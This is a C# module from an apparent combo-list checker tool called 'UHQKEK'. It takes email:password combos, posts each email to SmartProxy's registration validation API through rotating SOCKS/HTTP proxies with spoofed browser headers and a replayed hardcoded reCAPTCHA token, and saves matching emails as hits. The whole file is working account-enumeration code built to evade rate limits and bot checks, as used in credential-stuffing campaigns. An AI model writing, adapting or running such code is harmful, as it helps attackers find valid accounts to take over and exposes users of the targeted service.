using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class SmartProxy
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("accept", "application/json, text/plain, */*");
                httpRequest.AddHeader("authorization", "JWT null");
                httpRequest.AddHeader("origin", "https://dashboard.smartproxy.com");
                httpRequest.AddHeader("referer", "https://dashboard.smartproxy.com/register");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36");
                string str1 = httpRequest.Post("https://dashboard.smartproxy.com/api/v1/users/validate-email/", "{\"email\":\"" + strArray1[0] + "\",\"recaptcha\":\"03AGdBq27GCzmtxNAO4E7VoX_iVtI5W4Mn96hOLNDei6vwC_qaz7Vo3PB52FoGs3ye1djyRBsalVW9uY0nzjN62W7uFodK1lBCMu02LeHyjgUjLgoB3-6SBKmXN-M8DHhnGblkg8gM-FN02fjwbqnvN1XZGHnJoPZb4DeIuSv_woILR4sDxzdsRsswrhD3LXNKzOUtwbwQgefQE4gCBYPlexBjWoNxLuJLWSCEVjHeFBzuz-1Y6OVSysJa4O2WDfZawRKoXOut8rp8VVI6ZHjKoXvqOoZ5czyhrUv9jHHoXiGwsP0kZPRhKsHFvuH5ivWDBX3TC092FV3C2DcPMAZiJGlXqEsoEfmPEAKdsDeXF36qkrS0k-99vvvgohrSM3IDZ_xDrIz7-bFGJ-vJ5w2HpXkHp0obOHQgZk2Iq9mChRUfR-YvqRNhRdJiBqtZgYy7diq5tUlLTveBXVsFWlQB_KN-UOGDML7HZg\"}", "application/x-www-form-urlencoded").ToString();
                if (str1.Contains("Invalid email address"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Apple VM");
                    return true;
                }
                else if (str1.Contains("{}"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    //Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
